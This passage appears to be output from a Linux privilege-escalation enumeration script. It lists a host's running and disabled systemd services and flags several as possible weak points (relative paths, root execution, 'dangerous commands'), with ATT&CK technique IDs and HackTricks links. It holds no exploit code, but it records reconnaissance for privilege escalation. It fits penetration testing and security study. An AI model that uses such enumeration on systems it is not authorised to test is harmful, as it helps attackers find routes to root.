+iscsi-shutdown.service             loaded active exited  Logout off all iSCSI sessions on shutdown
+  Potential issue in service file: /usr/lib/systemd/system/iscsi-shutdown.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+kmod-static-nodes.service          loaded active exited  Create list of required static device nodes for the current kernel
+libstoragemgmt.service             loaded active running libstoragemgmt plug-in server daemon
+  Potential issue in service: libstoragemgmt.service
+  └─ RUNS_AS_ROOT: Service runs as root\n
+lvm2-lvmetad.service               loaded active running LVM2 metadata daemon
+lvm2-monitor.service               loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
+lvm2-pvscan@8:2.service            loaded active exited  LVM2 PV scan on device 8:2
+mariadb.service                    loaded active running MariaDB database server
+mongod.service                     loaded active running High-performance, schema-free document-oriented database
+network.service                    loaded active exited  LSB: Bring up/down networking
+NetworkManager-wait-online.service loaded active exited  Network Manager Wait Online
+NetworkManager.service             loaded active running Network Manager
+polkit.service                     loaded active running Authorization Manager
+postfix.service                    loaded active running Postfix Mail Transport Agent
+redis.service                      loaded active running Redis persistent key-value database
+  Potential issue in service: redis.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+rngd.service                       loaded active running Hardware RNG Entropy Gatherer Daemon
+rsyslog.service                    loaded active running System Logging Service
+sangoma-pnpd.service               loaded active running Sangoma PnP Service
+smartd.service                     loaded active running Self Monitoring and Reporting Technology (SMART) Daemon
+sshd.service                       loaded active running OpenSSH server daemon
+sysstat.service                    loaded active exited  Resets System Activity Logs
+  Potential issue in service: sysstat.service
+  └─ RUNS_AS_ROOT: Service runs as root\n
+systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
+systemd-journald.service           loaded active running Journal Service
+systemd-logind.service             loaded active running Login Service
+systemd-random-seed.service        loaded active exited  Load/Save Random Seed
+systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
+  Potential issue in service: systemd-remount-fs.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+systemd-sysctl.service             loaded active exited  Apply Kernel Variables
+systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
+systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
+systemd-udev-settle.service        loaded active exited  udev Wait for Complete Device Initialization
+systemd-udev-trigger.service       loaded active exited  udev Coldplug all Devices
+  Potential issue in service: systemd-udev-trigger.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+systemd-udevd.service              loaded active running udev Kernel Device Manager
+systemd-update-utmp.service        loaded active exited  Update UTMP about System Boot/Shutdown
+systemd-user-sessions.service      loaded active exited  Permit User Sessions
+systemd-vconsole-setup.service     loaded active exited  Setup Virtual Console
+tuned.service                      loaded active running Dynamic System Tuning Daemon
+vega_bridge.service                loaded active running SYSV: Vega Bridge Startup Script.
+vgauthd.service                    loaded active running VGAuth Service for open-vm-tools
+vmtoolsd.service                   loaded active running Service for virtual machines hosted on VMware
+xinetd.service                     loaded active running Xinetd A Powerful Replacement For Inetd
+LOAD   = Reflects whether the unit definition was properly loaded.
+ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
+SUB    = The low-level unit activation state, values depend on unit type.
+55 loaded units listed. Pass --all to see loaded but inactive units, too.
+To show all installed unit files use 'systemctl list-unit-files'.
+
+══╣ Disabled services: (T1543.002,T1007)
+abrt-pstoreoops.service       disabled
+apcupsd.service               disabled
+arp-ethers.service            disabled
+blk-availability.service      disabled
+chrony-wait.service           disabled
+console-getty.service         disabled
+console-shell.service         disabled
+  Potential issue in service: console-shell.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+cpupower.service              disabled
+debug-shell.service           disabled
+  Potential issue in service: debug-shell.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+dnsmasq.service               disabled
+ebtables.service              disabled
+fail2ban.service              disabled
+fancontrol.service            disabled
+fcoe.service                  disabled
+ip6tables.service             disabled
+iprdump.service               disabled
+iprinit.service               disabled
+iprupdate.service             disabled
+iptables.service              disabled
+iscsid.service                disabled
+iscsiuio.service              disabled
+kpatch.service                disabled
+lldpad.service                disabled
+mongos.service                disabled
+nfs-rquotad.service           disabled
+ntpd.service                  disabled
+ntpdate.service               disabled
+openvpn-client@.service       disabled
+openvpn-server@.service       disabled
+openvpn@.service              disabled
+plymouth-halt.service         disabled
+plymouth-kexec.service        disabled
+plymouth-poweroff.service     disabled
+plymouth-quit-wait.service    disabled
+plymouth-quit.service         disabled
+plymouth-read-write.service   disabled
+plymouth-reboot.service       disabled
+plymouth-start.service        disabled
+psacct.service                disabled
+radiusd.service               disabled
+rdisc.service                 disabled
+redis-sentinel.service        disabled
+  Potential issue in service: redis-sentinel.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+rhel-autorelabel-mark.service disabled
+rhel-autorelabel.service      disabled
+rhel-configure.service        disabled
+rhel-dmesg.service            disabled
+rhel-domainname.service       disabled
+rhel-import-state.service     disabled
+rhel-loadmodules.service      disabled
+rhel-readonly.service         disabled
+rngd-sw.service               disabled
+rpc-rquotad.service           disabled
+rpcbind.service               disabled
+rsyncd.service                disabled
+serial-getty@.service         disabled
+systemd-bootchart.service     disabled
+systemd-nspawn@.service       disabled
+tcsd.service                  disabled
+vsftpd.service                disabled
+vsftpd@.service               disabled
+60 unit files listed.
+
+══╣ Additional service files: (T1543.002,T1007)
+  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/abrt-oops.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/abrt-xorg.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+  Potential issue in service file: /etc/systemd/system/remote-fs.target.wants/iscsi.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+You can't write on systemd PATH
+
+╔══════════╣ Systemd Information (T1543.002)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
+═╣ Systemd version and vulnerabilities? .............. ═╣ Services running as root? ..... 
+═╣ Running services with dangerous capabilities? ... 
+═╣ Services with writable paths? . 
+╔══════════╣ Systemd PATH (T1543.002)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+╔══════════╣ Analyzing .socket files (T1559)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
+
+╔══════════╣ Unix Sockets Analysis (T1571,T1049)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
